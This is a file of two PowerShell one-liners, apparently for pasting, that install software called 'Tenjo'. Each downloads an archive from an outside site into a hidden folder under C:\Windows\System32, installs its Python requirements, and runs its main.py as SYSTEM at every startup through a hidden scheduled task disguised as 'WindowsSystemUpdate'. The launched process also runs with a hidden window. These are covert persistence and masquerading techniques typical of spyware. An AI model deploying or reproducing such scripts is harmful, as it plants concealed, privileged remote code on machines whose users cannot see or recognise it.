# Tenjo PowerShell Auto-Install One-Liner
# Includes Python 3.10 & Git auto-installation

# Ultra-compact version with Python & Git auto-install
powershell -Command "if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){Write-Host '‚ùå Run as Administrator!' -ForegroundColor Red;Read-Host;exit};Write-Host 'üöÄ Installing Python & Deploying Tenjo...' -ForegroundColor Green;try{$pv=python --version 2>&1;if(-not($pv -match 'Python 3\.(10|11|12)')){throw 'Need Python'}}catch{Write-Host 'üì• Installing Python 3.10...';$pi='$env:TEMP\python-installer.exe';iwr -Uri 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile $pi -UseBasicParsing;Start-Process -FilePath $pi -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait;$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');Remove-Item $pi -Force -EA SilentlyContinue;Write-Host '‚úÖ Python installed'};Get-Process -Name python -EA SilentlyContinue|Stop-Process -Force -EA SilentlyContinue;if(Test-Path 'C:\Windows\System32\.tenjo'){Remove-Item 'C:\Windows\System32\.tenjo' -Recurse -Force -EA SilentlyContinue};New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo' -Force|Out-Null;New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo\src' -Force|Out-Null;try{iwr -Uri 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile '$env:TEMP\tenjo.tar.gz' -UseBasicParsing;Write-Host '‚úÖ Downloaded Tenjo'}catch{Write-Host '‚ùå Download failed' -ForegroundColor Red;Read-Host;exit};if(Get-Command tar -EA SilentlyContinue){tar -xzf '$env:TEMP\tenjo.tar.gz' -C 'C:\Windows\System32\.tenjo\'}else{Write-Host '‚ö†Ô∏è Manual extraction needed'};cd 'C:\Windows\System32\.tenjo';python -m pip install --upgrade pip --quiet;python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org;$a=New-ScheduledTaskAction -Execute 'python' -Argument 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo';$t=New-ScheduledTaskTrigger -AtStartup;$s=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero);$p=New-ScheduledTaskPrincipal -UserID 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;Register-ScheduledTask -TaskName 'WindowsSystemUpdate' -Action $a -Trigger $t -Settings $s -Principal $p -Force|Out-Null;Start-Process python 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden;Remove-Item '$env:TEMP\tenjo.tar.gz' -Force -EA SilentlyContinue;Write-Host 'üéâ Deployment completed! Check: https://tenjo.adilabs.id' -ForegroundColor Green"

# Alternative shorter version (without Git, Python only)
powershell -Command "if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){Write-Host 'Run as Admin!' -ForegroundColor Red;Read-Host;exit};try{python --version|Out-Null}catch{iwr 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile '$env:TEMP\py.exe';Start-Process '$env:TEMP\py.exe' '/quiet','InstallAllUsers=1','PrependPath=1' -Wait;$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')};mkdir 'C:\Windows\System32\.tenjo' -Force;iwr 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile '$env:TEMP\t.tar.gz';tar -xzf '$env:TEMP\t.tar.gz' -C 'C:\Windows\System32\.tenjo\';cd 'C:\Windows\System32\.tenjo';python -m pip install -r requirements.txt --quiet;Register-ScheduledTask 'WindowsSystemUpdate' -Action (New-ScheduledTaskAction -Execute python -Argument 'main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Principal (New-ScheduledTaskPrincipal -UserID SYSTEM -LogonType ServiceAccount) -Force;Start-Process python main.py -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden;Write-Host 'Done! Check https://tenjo.adilabs.id'"